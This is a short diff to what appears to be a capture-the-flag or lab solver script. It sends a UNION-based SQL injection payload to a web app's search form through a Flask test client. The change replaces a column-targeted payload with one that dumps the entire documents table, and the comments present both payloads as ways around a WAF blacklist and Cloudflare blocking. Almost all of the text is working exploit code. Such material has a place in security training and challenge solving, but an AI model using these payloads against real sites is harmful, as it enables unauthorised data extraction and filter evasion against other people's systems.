@@ -13,8 +13,8 @@ def solve():
     client = app.test_client()
     
     print("[+] Step 2: Exploiting Web Search via Medium-Hard UNION SQL Injection...")
-    # Using Medium-Hard UNION SELECT bypass payload (avoids WAF blacklist and Cloudflare 403)
-    sqli_payload = "%' UNION SELECT title, access_level, file_path, author FROM documents WHERE access_level LIKE '%"
+    # Using UNION SELECT * bypass payload (avoids WAF blacklist and dumps all documents at once)
+    sqli_payload = "%' UNION SELECT * FROM documents --"
     res = client.post("/search", data={'q': sqli_payload})
     html = res.data.decode('utf-8')
     
